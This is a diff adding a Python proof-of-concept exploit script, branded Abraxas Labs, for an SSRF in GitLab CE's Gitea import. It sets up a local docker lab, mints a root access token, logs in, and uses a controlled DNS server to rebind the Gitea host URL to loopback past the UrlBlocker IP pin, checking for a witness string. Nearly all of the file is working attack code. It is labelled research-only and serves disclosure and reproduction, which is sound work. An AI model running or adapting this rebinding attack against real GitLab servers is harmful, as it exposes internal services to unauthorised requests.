@@ -1,0 +1,715 @@
+#!/usr/bin/env python3
+######################################################################################
+#
+#        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.
+#       d88888 888  "88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b
+#      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.
+#     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  "Y888b.
+#    d88P  888 888  "Y88b 8888888P"     d88P  888    d888b       d88P  888     "Y88b.
+#   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       "888
+#  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P
+# d88P     888 8888888P"  888   T88b d88P     888 d88P   Y88b d88P     888  "Y8888P"
+#
+#                     888             d8888 888888b.    .d8888b.
+#                     888            d88888 888  "88b  d88P  Y88b
+#                     888           d88P888 888  .88P  Y88b.
+#                     888          d88P 888 8888888K.   "Y888b.
+#                     888         d88P  888 888  "Y88b     "Y88b.
+#                     888        d88P   888 888    888       "888
+#                     888       d8888888888 888   d88P Y88b  d88P
+#                     88888888 d88P     888 8888888P"   "Y8888P"
+#
+#  Website : https://abraxaslabs.tech
+#  GitHub  : https://github.com/abraxas
+#  Twitter : @abraxas_null
+#  Mail    : abraxas.null@proton.me
+#
+#  CVE: gitlab-gitea-import-ssrf (High: 7.7)
+#  Vendor: GitLab CE (GitLab Inc.)
+#  Versions: GitLab CE <= 19.4.1
+#  Impact: Gitea HTTPS import SSRF via UrlBlocker pin drop
+#  Requires: authenticated Gitea import on loopback GitLab CE
+#
+######################################################################################
+#
+#  RESEARCH / EDUCATIONAL USE ONLY.
+#  Do not run, deploy, or use this material against any host unless you have
+#  explicit written permission from both the party hosting this repository
+#  and the owner of the target systems.
+#
+######################################################################################
+
+import os as _os
+import shutil as _shutil
+import sys as _sys
+import builtins as _builtins
+
+_ART = {"abraxas": ["        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.", "       d88888 888  \"88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b", "      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.", "     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  \"Y888b.", "    d88P  888 888  \"Y88b 8888888P\"     d88P  888    d888b       d88P  888     \"Y88b.", "   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       \"888", "  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P", " d88P     888 8888888P\"  888   T88b d88P     888 d88P   Y88b d88P     888  \"Y8888P\""], "labs": ["                     888             d8888 888888b.    .d8888b.", "                     888            d88888 888  \"88b  d88P  Y88b", "                     888           d88P888 888  .88P  Y88b.", "                     888          d88P 888 8888888K.   \"Y888b.", "                     888         d88P  888 888  \"Y88b     \"Y88b.", "                     888        d88P   888 888    888       \"888", "                     888       d8888888888 888   d88P Y88b  d88P", "                     88888888 d88P     888 8888888P\"   \"Y8888P\""]}
+_CVE = "gitlab-gitea-import-ssrf"
+_SITE = "https://abraxaslabs.tech"
+_GH = "https://github.com/abraxas"
+_XURL = "https://x.com/abraxas_null"
+_XH = "@abraxas_null"
+_EMAIL = "abraxas.null@proton.me"
+_RST = "\033[0m"
+_BLD = "\033[1m"
+
+
+def _on():
+    return not _os.environ.get("NO_COLOR")
+
+
+def _rgb(r, g, b):
+    return f"\033[38;2;{r};{g};{b}m" if _on() else ""
+
+
+_RAIN = [
+    (255, 77, 224), (255, 0, 212), (191, 95, 255), (91, 140, 255),
+    (0, 210, 255), (0, 255, 249), (57, 255, 20), (180, 255, 70),
+    (255, 230, 0), (255, 201, 70), (255, 122, 24), (255, 64, 96),
+]
+
+
+def _lerp(a, b, t):
+    return tuple(int(a[i] + (b[i] - a[i]) * t) for i in range(3))
+
+
+def _rain(x, width):
+    if width <= 1:
+        return _RAIN[0]
+    t = (x / (width - 1)) * (len(_RAIN) - 1)
+    i = min(int(t), len(_RAIN) - 2)
+    return _lerp(_RAIN[i], _RAIN[i + 1], t - i)
+
+
+def _logo_line(line, y, n):
+    width = max(len(line), 1)
+    out = []
+    q = False
+    for x, ch in enumerate(line):
+        if ch == " ":
+            out.append(ch)
+            continue
+        if ch == '"':
+            q = not q
+            out.append(_rgb(*(255, 201, 70) if q else (255, 230, 0)) + ch)
+            continue
+        if q:
+            out.append(_rgb(255, 230, 0) + ch)
+            continue
+        r, g, b = _rain(x, width)
+        out.append(_rgb(r, g, b) + ch)
+    return "".join(out) + _RST
+
+
+def print_abraxas_banner():
+    cols = _shutil.get_terminal_size((120, 30)).columns
+    art = _ART["abraxas"] + _ART["labs"]
+    art_w = max(len(x) for x in art)
+    content_w = min(max(art_w, 88), max(cols - 4, 40))
+    box_w = content_w + 4
+    if box_w > cols:
+        content_w = max(cols - 4, 20)
+        box_w = content_w + 4
+    cyan, mag = _rgb(0, 255, 249), _rgb(255, 0, 212)
+    top = cyan + "╔" + "═" * (box_w - 2) + "╗" + _RST
+    mid = mag + "╠" + "═" * (box_w - 2) + "╣" + _RST
+    bot = cyan + "╚" + "═" * (box_w - 2) + "╝" + _RST
+
+    def row(vis, rendered, border):
+        return _rgb(*border) + "║" + _RST + " " + rendered + _RST + " " + _rgb(*border) + "║" + _RST
+
+    lines = [top]
+    title_l, title_r = " ABRAXAS LABS", "analyze · reverse · disclose"
+    gap = max(content_w - len(title_l) - len(title_r), 1)
+    title = (title_l + " " * gap + title_r)[:content_w].ljust(content_w)
+    cells = []
+    split, rstart = len(title_l), content_w - len(title_r)
+    for i, ch in enumerate(title):
+        if ch == " ":
+            cells.append(ch)
+        elif i < split:
+            cells.append(_rgb(0, 255, 249) + _BLD + ch)
+        elif i >= rstart:
+            cells.append(_rgb(140, 155, 175) + ch)
+        else:
+            cells.append(ch)
+    lines.append(row(title, "".join(cells) + _RST, (0, 255, 249)))
+    lines.append(mid)
+    cve_l = " " + _CVE
+    cve_r = "authorized research only"
+    rest = max(content_w - len(cve_l) - len(cve_r), 3)
+    midtxt = " local lab ".center(rest)[:rest]
+    cve_line = (cve_l + midtxt + cve_r)[:content_w].ljust(content_w)
+    cells = []
+    le, rs = len(cve_l), content_w - len(cve_r)
+    for i, ch in enumerate(cve_line):
+        if ch == " ":
+            cells.append(ch)
+        elif i < le:
+            cells.append(_rgb(255, 77, 224) + _BLD + ch)
+        elif i >= rs:
+            cells.append(_rgb(57, 255, 20) + ch)
+        else:
+            cells.append(_rgb(255, 0, 212) + ch)
+    lines.append(row(cve_line, "".join(cells) + _RST, (255, 0, 212)))
+    lines.append(mid)
+    n = len(_ART["abraxas"])
+    for y, line in enumerate(_ART["abraxas"]):
+        vis = line[:content_w].ljust(content_w)
+        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
+    for y, line in enumerate(_ART["labs"]):
+        vis = line[:content_w].ljust(content_w)
+        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
+    lines.append(mid)
+    for left, right in (("Website", _SITE), ("GitHub", _GH), ("X", _XH + "  " + _XURL), ("Mail", _EMAIL)):
+        gap = max(content_w - 1 - len(left) - len(right), 1)
+        vis = (" " + left + " " * gap + right)[:content_w].ljust(content_w)
+        out = []
+        left_end = 1 + len(left)
+        right_start = content_w - len(right)
+        for i, ch in enumerate(vis):
+            if ch == " ":
+                out.append(ch)
+            elif i < left_end:
+                out.append(_rgb(255, 230, 0) + ch)
+            elif i >= right_start:
+                out.append(_rgb(0, 255, 249) + ch)
+            else:
+                out.append(ch)
+        lines.append(row(vis, "".join(out) + _RST, (255, 0, 212)))
+    lines.append(bot)
+    status = "[*]  abraxas!null ready on #labs   ·   " + _SITE
+    scol = []
+    for ch in status:
+        if ch == " ":
+            scol.append(ch)
+        elif ch in "[]*":
+            scol.append(_rgb(57, 255, 20) + ch)
+        elif ch in "·#":
+            scol.append(_rgb(255, 77, 224) + ch)
+        else:
+            scol.append(_rgb(232, 255, 248) + ch)
+    lines.append(" " + "".join(scol) + _RST)
+    _sys.stdout.write("\n".join(lines) + "\n\n")
+    _sys.stdout.flush()
+
+
+def _cprint(*args, **kwargs):
+    sep = kwargs.get("sep", " ")
+    s = sep.join(str(a) for a in args)
+    low = s.lower()
+    if s.startswith("SUCCESS") or "success" == low[:7]:
+        col = _rgb(57, 255, 20) + _BLD
+    elif s.startswith("FAIL") or low.startswith("fail"):
+        col = _rgb(255, 64, 96) + _BLD
+    elif "user_id" in low:
+        col = _rgb(255, 201, 70) + _BLD
+    elif low.startswith("status=") or "status=" in low[:20]:
+        col = _rgb(0, 255, 249)
+    elif low.startswith("carrier"):
+        col = _rgb(255, 0, 212)
+    elif s.lstrip().startswith("{") or s.lstrip().startswith("["):
+        col = _rgb(255, 230, 0)
+    else:
+        col = _rgb(232, 255, 248)
+    kwargs = dict(kwargs)
+    file = kwargs.get("file", _sys.stdout)
+    if file is _sys.stdout or file is _sys.stderr:
+        _builtins.print(col + s + _RST, **{k: v for k, v in kwargs.items() if k != "sep"})
+    else:
+        _builtins.print(*args, **kwargs)
+
+
+print_abraxas_banner()
+_builtins.print = _cprint
+
+"""GitLab CE 19.4.1 Gitea HTTPS import drops UrlBlocker IP pin."""
+
+
+import json
+import os
+import re
+import subprocess
+import sys
+import time
+import urllib.error
+import urllib.parse
+import urllib.request
+
+WITNESS = "GITLAB-GITEA-IMPORT-SSRF-WITNESS"
+LABEL = "GITLAB-GITEA-IMPORT-SSRF"
+GITLAB = os.environ.get("GITLAB_URL", "http://127.0.0.1:18400").rstrip("/")
+COMPOSE_PROJECT = os.environ.get("COMPOSE_PROJECT_NAME", "gitlab-gitea-import-ssrf")
+DNS_CONTROL = os.environ.get("DNS_CONTROL", "http://127.0.0.1:18453").rstrip("/")
+READY_TIMEOUT = int(os.environ.get("GITLAB_READY_TIMEOUT", "1200"))
+ROOT_PASSWORD = os.environ.get("GITLAB_ROOT_PASSWORD", "CveL4b!Xk92#Qm")
+LAB_PASSWORD = "L4bUs3r!Qm92#x"
+GITEA_HTTPS = "https://gitea.lab/"
+GITEA_HTTP = "http://gitea.lab/"
+DIRECT_LOOPBACK = "https://127.0.0.1/"
+HERE = os.path.dirname(os.path.abspath(__file__))
+
+
+class NoRedirect(urllib.request.HTTPRedirectHandler):
+    def redirect_request(self, req, fp, code, msg, headers, newurl):  # noqa: ANN001
+        return None
+
+
+def log(msg: str) -> None:
+    print(msg, flush=True)
+
+
+def fail(reason: str) -> None:
+    log(f"FAIL {LABEL} {reason}")
+    raise SystemExit(1)
+
+
+def success(detail: str) -> None:
+    log(f"SUCCESS {LABEL} {detail} {WITNESS}")
+    raise SystemExit(0)
+
+
+def compose(*args: str, timeout: int = 120) -> subprocess.CompletedProcess[str]:
+    return subprocess.run(
+        ["docker", "compose", "-p", COMPOSE_PROJECT, *args],
+        cwd=HERE,
+        text=True,
+        capture_output=True,
+        timeout=timeout,
+    )
+
+
+def csrf_token(html: str) -> str:
+    patterns = (
+        r'name="authenticity_token"\s+value="([^"]+)"',
+        r'value="([^"]+)"\s+name="authenticity_token"',
+        r'name="csrf-token"\s+content="([^"]+)"',
+        r'content="([^"]+)"\s+name="csrf-token"',
+        r'"csrf-token"\s+content="([^"]+)"',
+        r'<meta name="csrf-token" content="([^"]+)"',
+    )
+    for pat in patterns:
+        match = re.search(pat, html, re.I)
+        if match:
+            return match.group(1)
+    return ""
+
+
+class Browser:
+    def __init__(self) -> None:
+        self.cookies = urllib.request.HTTPCookieProcessor()
+        self.opener = urllib.request.build_opener(self.cookies, NoRedirect)
+        self.follow = urllib.request.build_opener(self.cookies)
+
+    def request(
+        self,
+        method: str,
+        url: str,
+        data: bytes | None = None,
+        headers: dict[str, str] | None = None,
+        timeout: int = 60,
+        follow: bool = False,
+    ) -> tuple[int, str, dict[str, str]]:
+        hdrs = {
+            "Accept": "text/html,application/json;q=0.9,*/*;q=0.8",
+            "User-Agent": "cve-lab-gitea-import/1.0",
+        }
+        if headers:
+            hdrs.update(headers)
+        req = urllib.request.Request(url, data=data, headers=hdrs, method=method)
+        opener = self.follow if follow else self.opener
+        try:
+            with opener.open(req, timeout=timeout) as resp:
+                body = resp.read().decode("utf-8", "replace")
+                return resp.getcode(), body, dict(resp.headers.items())
+        except urllib.error.HTTPError as exc:
+            try:
+                self.cookies.cookiejar.extract_cookies(exc, req)
+            except Exception:
+                pass
+            body = exc.read().decode("utf-8", "replace")
+            return exc.code, body, dict(exc.headers.items()) if exc.headers else {}
+        except urllib.error.URLError as exc:
+            return 0, str(exc.reason), {}
+
+
+def http_json(
+    method: str,
+    path: str,
+    token: str | None = None,
+    payload: dict | None = None,
+    timeout: int = 60,
+) -> tuple[int, str]:
+    url = path if path.startswith("http") else f"{GITLAB}{path}"
+    data = None
+    headers = {"Accept": "application/json"}
+    if token:
+        headers["PRIVATE-TOKEN"] = token
+    if payload is not None:
+        data = json.dumps(payload).encode("utf-8")
+        headers["Content-Type"] = "application/json"
+    req = urllib.request.Request(url, data=data, headers=headers, method=method)
+    try:
+        with urllib.request.urlopen(req, timeout=timeout) as resp:
+            return resp.getcode(), resp.read().decode("utf-8", "replace")
+    except urllib.error.HTTPError as exc:
+        return exc.code, exc.read().decode("utf-8", "replace")
+    except urllib.error.URLError as exc:
+        return 0, str(exc.reason)
+
+
+def dns_api(method: str, path: str, timeout: int = 8) -> tuple[int, dict]:
+    url = f"{DNS_CONTROL}{path}"
+    req = urllib.request.Request(url, data=b"" if method == "POST" else None, method=method)
+    try:
+        with urllib.request.urlopen(req, timeout=timeout) as resp:
+            raw = resp.read().decode("utf-8", "replace")
+            return resp.getcode(), json.loads(raw) if raw else {}
+    except urllib.error.HTTPError as exc:
+        raw = exc.read().decode("utf-8", "replace")
+        try:
+            return exc.code, json.loads(raw) if raw else {}
+        except json.JSONDecodeError:
+            return exc.code, {"raw": raw}
+    except (urllib.error.URLError, json.JSONDecodeError) as exc:
+        return 0, {"error": str(exc)}
+
+
+def dns_reset(mode: str | None = None) -> None:
+    if mode:
+        status, body = dns_api("POST", f"/mode/{mode}")
+        log(f"dns-mode {mode} status={status} body={body}")
+        if status != 200:
+            fail(f"dns control mode failed {status} {body}")
+        return
+    status, body = dns_api("POST", "/reset")
+    log(f"dns-reset status={status} body={body}")
+    if status != 200:
+        fail(f"dns control reset failed {status} {body}")
+
+
+def dns_stats() -> dict:
+    status, body = dns_api("GET", "/stats")
+    log(f"dns-stats status={status} lookups={body.get('a_lookups')} mode={body.get('mode')}")
+    events = body.get("events") or []
+    for ev in events[-12:]:
+        log(f"dns-event n={ev.get('n')} name={ev.get('name')} ip={ev.get('ip')}")
+    return body
+
+
+def wait_ready() -> None:
+    deadline = time.time() + READY_TIMEOUT
+    last = "none"
+    browser = Browser()
+    while time.time() < deadline:
+        status, body, _hdrs = browser.request("GET", f"{GITLAB}/users/sign_in", timeout=10)
+        last = f"{status} {body[:80]!r}"
+        if status == 200 and ("sign_in" in body.lower() or "password" in body.lower() or "gitlab" in body.lower()):
+            log(f"gitlab-ready {last}")
+            return
+        log(f"gitlab-wait {last}")
+        time.sleep(8)
+    fail(f"gitlab not ready after {READY_TIMEOUT}s last={last}")
+
+
+def mint_and_enable() -> str:
+    ruby = r"""
+s = ApplicationSetting.current
+sources = Array(s.import_sources)
+wanted = %w[gitea github git gitlab_project bitbucket bitbucket_server fogbugz manifest]
+s.update!(import_sources: (sources | wanted)) unless (wanted - sources).empty?
+root = User.find_by_username('root')
+raise 'no root user' unless root
+root.personal_access_tokens.where(name: 'cve-lab-gitea-import').find_each(&:revoke!)
+pat = root.personal_access_tokens.create!(
+  name: 'cve-lab-gitea-import',
+  scopes: [:api],
+  expires_at: 364.days.from_now
+)
+puts "PAT=#{pat.token}"
+puts "IMPORT=#{Array(ApplicationSetting.current.import_sources).include?('gitea')}"
+puts "LOCAL=#{Gitlab::CurrentSettings.allow_local_requests_from_web_hooks_and_services?}"
+"""
+    last = ""
+    for attempt in range(1, 9):
+        log(f"mint-pat gitlab-rails runner attempt={attempt}")
+        proc = compose("exec", "-T", "gitlab", "gitlab-rails", "runner", ruby, timeout=300)
+        out = (proc.stdout or "") + (proc.stderr or "")
+        last = f"rc={proc.returncode} out={out[-2000:]}"
+        log(f"mint-pat {last[:400]}")
+        token = ""
+        for line in out.splitlines():
+            if line.startswith("PAT=") and len(line) > 8:
+                token = line.split("=", 1)[1].strip()
+            if line.startswith("LOCAL=") and line.split("=", 1)[1].strip().lower() == "true":
+                fail("allow_local_requests_from_web_hooks_and_services is on")
+        if token:
+            log("mint-pat ok")
+            return token
+        time.sleep(20)
+    fail(f"pat mint failed {last}")
+
+
+def ensure_labuser(token: str) -> str:
+    status, body = http_json("GET", "/api/v4/users?username=labuser", token)
+    if status == 200:
+        try:
+            rows = json.loads(body)
+            if isinstance(rows, list) and rows:
+                log("labuser exists")
+                return "labuser"
+        except json.JSONDecodeError:
+            pass
+    status, body = http_json(
+        "POST",
+        "/api/v4/users",
+        token,
+        {
+            "email": "lab@localhost.invalid",
+            "username": "labuser",
+            "name": "Lab User",
+            "password": LAB_PASSWORD,
+            "skip_confirmation": True,
+        },
+    )
+    log(f"labuser-create status={status} body={body[:240]!r}")
+    if status in (200, 201) or (status == 409) or "already been taken" in body.lower():
+        return "labuser"
+    log("labuser-create failed; using root")
+    return "root"
+
+
+def login(browser: Browser, username: str, password: str) -> None:
+    status, body, _hdrs = browser.request("GET", f"{GITLAB}/users/sign_in", timeout=30)
+    if status != 200:
+        fail(f"sign_in page {status} {body[:200]}")
+    token = csrf_token(body)
+    if not token:
+        fail("sign_in missing authenticity_token")
+    payload = urllib.parse.urlencode(
+        {
+            "authenticity_token": token,
+            "user[login]": username,
+            "user[password]": password,
+            "user[remember_me]": "0",
+        }
+    ).encode("utf-8")
+    status, body, hdrs = browser.request(
+        "POST",
+        f"{GITLAB}/users/sign_in",
+        data=payload,
+        headers={
+            "Content-Type": "application/x-www-form-urlencoded",
+            "Referer": f"{GITLAB}/users/sign_in",
+            "Origin": GITLAB,
+        },
+        timeout=30,
+        follow=True,
+    )
+    loc = hdrs.get("Location") or hdrs.get("location") or ""
+    log(f"login user={username} status={status} location={loc[:120]} cookies={len(list(browser.cookies.cookiejar))}")
+    if status in (302, 303, 301) and "sign_in" in loc:
+        fail(f"login redirected back to sign_in {loc}")
+    if status == 200 and ("Invalid login" in body or ("invalid" in body.lower() and "password" in body.lower() and "sign_in" in body.lower())):
+        fail("login rejected")
+    home_status, home, _hdrs = browser.request("GET", f"{GITLAB}/", timeout=30, follow=True)
+    blob = home.lower()
+    if "sign_in" in blob and "sign-out" not in blob and "sign_out" not in blob and username.lower() not in blob:
+        fail(f"login session missing status={home_status} {home[:180]}")
+    log(f"login-session ok user={username} home={home_status}")
+
+
+def enable_gitea_import(token: str) -> None:
+    status, body = http_json(
+        "PUT",
+        "/api/v4/application/settings",
+        token,
+        {
+            "import_sources": [
+                "github",
+                "bitbucket",
+                "bitbucket_server",
+                "fogbugz",
+                "git",
+                "gitlab_project",
+                "gitea",
+                "manifest",
+            ]
+        },
+    )
+    log(f"enable-gitea-import status={status} body={body[:180]!r}")
+    if status not in (200, 201):
+        fail(f"enable gitea import {status} {body[:200]}")
+
+
+def post_gitea_token(browser: Browser, host_url: str) -> tuple[int, str, dict[str, str]]:
+    status, body, _hdrs = browser.request("GET", f"{GITLAB}/import/gitea/new", timeout=30, follow=True)
+    log(f"gitea-new status={status} bytes={len(body)}")
+    if status == 404:
+        fail(f"gitea import 404 body={body[:300]!r}")
+    token = csrf_token(body)
+    if not token:
+        fail("gitea new missing authenticity_token")
+    payload = urllib.parse.urlencode(
+        {
+            "authenticity_token": token,
+            "gitea_host_url": host_url,
+            "personal_access_token": "lab-gitea-token",
+        }
+    ).encode("utf-8")
+    status, body, hdrs = browser.request(
+        "POST",
+        f"{GITLAB}/import/gitea/personal_access_token",
+        data=payload,
+        headers={
+            "Content-Type": "application/x-www-form-urlencoded",
+            "Referer": f"{GITLAB}/import/gitea/new",
+            "Origin": GITLAB,
+        },
+        timeout=30,
+    )
+    loc = hdrs.get("Location") or hdrs.get("location") or ""
+    log(f"gitea-token host={host_url} status={status} location={loc[:160]} body={body[:180]!r}")
+    return status, body, hdrs
+
+
+def get_status_json(browser: Browser, timeout: int = 90) -> tuple[int, str, dict[str, str]]:
+    status, body, hdrs = browser.request(
+        "GET",
+        f"{GITLAB}/import/gitea/status.json",
+        headers={"Accept": "application/json"},
+        timeout=timeout,
+    )
+    loc = hdrs.get("Location") or hdrs.get("location") or ""
+    log(f"status.json status={status} location={loc[:160]} body={body[:500]!r}")
+    if status in (301, 302, 303, 307, 308) and loc:
+        follow = loc if loc.startswith("http") else urllib.parse.urljoin(GITLAB + "/", loc)
+        st2, body2, hdrs2 = browser.request("GET", follow, timeout=30)
+        log(f"status.json-follow status={st2} body={body2[:400]!r}")
+        return st2, body2, hdrs2
+    return status, body, hdrs
+
+
+def blocked_text(status: int, body: str, hdrs: dict[str, str] | None = None) -> bool:
+    loc = ""
+    if hdrs:
+        loc = hdrs.get("Location") or hdrs.get("location") or ""
+    blob = f"{status} {body} {loc}".lower()
+    needles = (
+        "specified url cannot be used",
+        "cannot be used",
+        "requests to localhost",
+        "requests to loopback",
+        "blocked url",
+        "url is blocked",
+        "not allowed",
+    )
+    if any(n in blob for n in needles):
+        return True
+    return status in (422, 400) and "url" in blob
+
+
+def catcher_logs() -> str:
+    proc = compose("logs", "--tail=80", "catcher", timeout=30)
+    text = ((proc.stdout or "") + (proc.stderr or ""))[-2500:]
+    log("catcher-logs " + text)
+    return text
+
+
+def ssl_fail_reason(body: str, logs: str) -> str | None:
+    blob = f"{body}\n{logs}".lower()
+    if "certificate" in blob or "ssl" in blob or "certificate_verify_failed" in blob:
+        return "Faraday SSL verify blocked the catcher (CA not in GitLab trust store)"
+    return None
+
+
+def dump_production_log() -> str:
+    proc = compose(
+        "exec",
+        "-T",
+        "gitlab",
+        "bash",
+        "-lc",
+        "grep -E 'BlockedUrl|Octokit|Faraday|SSL|certificate|ConnectionFailed|Error|Exception' /var/log/gitlab/gitlab-rails/production.log 2>/dev/null | tail -n 40; echo '---'; tail -n 40 /var/log/gitlab/gitlab-rails/production.log 2>/dev/null || true",
+        timeout=40,
+    )
+    text = ((proc.stdout or "") + (proc.stderr or ""))[-2500:]
+    log("rails-log " + text)
+    return text
+
+
+def run_positive(browser: Browser, mode: str) -> tuple[bool, str]:
+    dns_reset(mode)
+    post_gitea_token(browser, GITEA_HTTPS)
+    status, body, hdrs = get_status_json(browser)
+    dns_stats()
+    logs = catcher_logs()
+    if WITNESS in body:
+        return True, f"status.json mode={mode} http={status}"
+    reason = ssl_fail_reason(body, logs) or dump_production_log()
+    ssl_reason = ssl_fail_reason(body, reason if isinstance(reason, str) else "")
+    if ssl_reason:
+        return False, ssl_reason
+    if blocked_text(status, body, hdrs):
+        return False, f"status.json blocked mode={mode} {status} {body[:180]}"
+    if WITNESS in logs:
+        return False, f"catcher saw GET but status.json missing witness mode={mode} {status} {body[:180]}"
+    return False, f"no witness mode={mode} {status} {body[:180]}"
+
+
+def main() -> None:
+    log(f"lab {LABEL} gitlab={GITLAB}")
+    wait_ready()
+    token = mint_and_enable()
+    enable_gitea_import(token)
+    who = ensure_labuser(token)
+    browser = Browser()
+    if who == "labuser":
+        login(browser, "labuser", LAB_PASSWORD)
+    else:
+        login(browser, "root", ROOT_PASSWORD)
+
+    dns_reset("first2_then_loopback")
+    post_gitea_token(browser, DIRECT_LOOPBACK)
+    neg_status, neg_body, neg_hdrs = get_status_json(browser, timeout=30)
+    if WITNESS in neg_body:
+        fail("NEGATIVE A loopback URL returned witness (UrlBlocker bypassed without rebind)")
+    if not blocked_text(neg_status, neg_body, neg_hdrs):
+        fail(f"NEGATIVE A https://127.0.0.1 expected blocked got {neg_status} {neg_body[:200]}")
+    log("negative-a https://127.0.0.1 blocked")
+
+    ok, detail = run_positive(browser, "pairs")
+    if not ok and "SSL verify" in detail:
+        fail(detail)
+    if not ok:
+        log(f"positive pairs missed ({detail}); retry first2_then_loopback")
+        ok, detail = run_positive(browser, "first2_then_loopback")
+        if not ok and "SSL verify" in detail:
+            fail(detail)
+        if not ok:
+            stats = dns_stats()
+            if stats.get("a_lookups", 0) > 2 and all(
+                ev.get("ip") == "1.1.1.1" for ev in (stats.get("events") or []) if ev.get("name") not in ("reset", "")
+            ):
+                fail("DNS cache makes every lookup 1.1.1.1")
+            fail(detail)
+
+    dns_reset("first2_then_loopback")
+    post_gitea_token(browser, GITEA_HTTP)
+    http_status, http_body, http_hdrs = get_status_json(browser, timeout=45)
+    dns_stats()
+    if WITNESS in http_body:
+        fail("NEGATIVE B HTTP gitea.lab returned witness (pin was dropped for HTTP too)")
+    log(f"negative-b http://gitea.lab no-witness status={http_status} blocked={blocked_text(http_status, http_body, http_hdrs)}")
+    success(detail)
+
+
+if __name__ == "__main__":
+    try:
+        main()
+    except SystemExit:
+        raise
+    except Exception as exc:  # noqa: BLE001 — last-line FAIL contract
+        fail(f"exception {type(exc).__name__}: {exc}")
+
